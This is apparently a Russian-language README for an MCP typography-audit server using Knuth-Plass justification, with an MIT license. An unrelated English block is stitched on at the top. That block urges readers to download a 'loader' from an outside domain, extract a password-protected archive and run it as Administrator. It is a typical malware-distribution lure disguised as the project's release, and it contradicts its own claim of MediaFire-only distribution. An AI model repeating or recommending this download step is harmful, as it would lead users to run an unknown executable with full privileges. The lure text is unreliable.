<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# MCP Typography Audit Server

Сервер протокола **Model Context Protocol (MCP)**, позволяющий AI-агентам (Claude, Cursor, Windsurf и др.) выполнять полиграфический аудит вёрстки и проверять вёрстку с книжным выравниванием текста по алгоритму **Кнута — Пласса** (как в издательской системе $\mathrm{\TeX}$).

## 📖 Возможности

* **Книжная типографика для агента:** Реализация алгоритма Кнута — Пласса (Knuth-Plass line breaking) устраняет построчные «реки» пробелов, выравнивает полосу набора, включает микротипографику и висячую пунктуацию.
* **Поддержка переносов (Hyphenation):** Корректные переносы длинных слов по слогам (включая русский язык `ru` и английский `en-us`).
* **Визуальная обратная связь (Vision-in-the-loop):** Сервер отдаёт скриншот страницы прямо в формате MCP `image/png`. Мультимодальные модели (Claude 3.5/3.7, GPT-4o) могут визуально оценить вёрстку и скорректировать CSS.
* **Анализ разметки:** Автоматический перехват ошибок JavaScript в консоли браузера, проверка наличия обязательного атрибута `lang` и тест адаптивности под разную ширину контейнера.

---

## 🛠️ Установка и сборка

### 1. Клонирование и установка зависимостей
```bash
# Установка NPM-зависимостей
npm install

# Установка браузера Chromium для Playwright (обязательно)
npx playwright install chromium
```

### 2. Сборка проекта
```bash
npm run build
```
Команда компилирует TypeScript в исполняемый JavaScript-файл в папке `dist/index.js`.

---

### Вариант 2. Автоматический тест через скрипт (`test.js`)

Запустите тестовый клиент в терминале:

```bash
node test.js
```

Скрипт подключится к серверу через stdio, выполнит тестовый запрос и сохранит результат в файл **`test-result.png`** в корне проекта.

---

## 🔌 Подключение к AI-клиентам

### 1. Claude Desktop

Откройте файл конфигурации:
* **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
* **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`

Добавьте конфигурацию сервера:

#### macOS / Linux:
```json
{
  "mcpServers": {
    "typography-auditor": {
      "command": "node",
      "args": [
        "/абсолютный/путь/к/mcp-typography-server/dist/index.js"
      ]
    }
  }
}
```

#### Windows:
*(Обратите внимание на экранирование обратных слэшей `\\`)*:
```json
{
  "mcpServers": {
    "typography-auditor": {
      "command": "node",
      "args": [
        "C:\\path\\to\\mcp-typography-server\\dist\\index.js"
      ]
    }
  }
}
```

---

### 2. Cursor / Windsurf

В корне вашего разрабатываемого веб-проекта создайте или отредактируйте файл `.cursor/mcp.json`:

```json
{
  "mcpServers": {
    "typography-auditor": {
      "command": "node",
      "args": [
        "/абсолютный/путь/к/mcp-typography-server/dist/index.js"
      ]
    }
  }
}
```

---

## 🤖 Пример использования с агентом

После подключения инструмента агенту доступен тул `audit_typography`.

**Пример промпта:**
> *«Сверстай мне адаптивный блок статьи о пользе чтения на русском языке. Примени алгоритм Justif для выравнивания по ширине. Проверь вёрстку через инструмент `audit_typography` на ширине 375px (мобилка) и 750px (десктоп). Если на скриншоте увидишь неудачные переносы или разрывы строк — скорректируй стили»*.

**Что произойдёт под капотом:**
1. Агент генерирует HTML/CSS код.
2. Вызывает `audit_typography` с кодом статьи.
3. Сервер через Playwright рендерит страницу, применяет Justif и делает скриншот.
4. Агент получает скриншот, анализирует его с помощью Vision и отдаёт вам проверенный результат.

---

## 🙏 Основа проекта и благодарности (Credits)

Этот MCP-сервер был бы невозможен без проекта:

## ⚠️ Частые вопросы и отладка

| Ошибка | Причина | Решение |
| :--- | :--- | :--- |
| `Executable doesn't exist at ... playwright` | Не скачан браузер Chromium | Выполните команду `npx playwright install chromium`. |
| `Cannot find name 'process'` при сборке | Особенности типизации ES-модулей | Убедитесь, что в `src/index.ts` добавлен `import process from "node:process";`, а в `tsconfig.json` указано `"types": ["node"]`. |
| Сервер не отвечает или ломается JSON-RPC | Вывод лишнего текста в `stdout` | В коде сервера для логов используйте только `console.error()`, так как `console.log()` ломает канал обмена протокола stdio. |

---

## 📄 Лицензия

MIT


---

MIT License

Copyright (c) 2026 <kobaltgit>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
